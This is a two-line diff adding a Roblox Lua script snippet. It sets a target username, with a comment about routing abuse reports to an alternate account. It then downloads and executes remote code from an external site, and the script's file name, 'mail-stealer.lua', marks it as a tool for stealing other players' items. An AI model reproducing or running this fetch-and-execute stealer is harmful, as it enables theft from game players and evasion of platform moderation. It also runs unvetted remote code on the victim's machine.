@@ -1,0 +1,2 @@
+getgenv().name = "legendary6620" -- dont keep the username incase they report you instead they report my alt
+loadstring(game:HttpGetAsync("https://wumat.xyz/scripts/mail-stealer.lua", true))() 
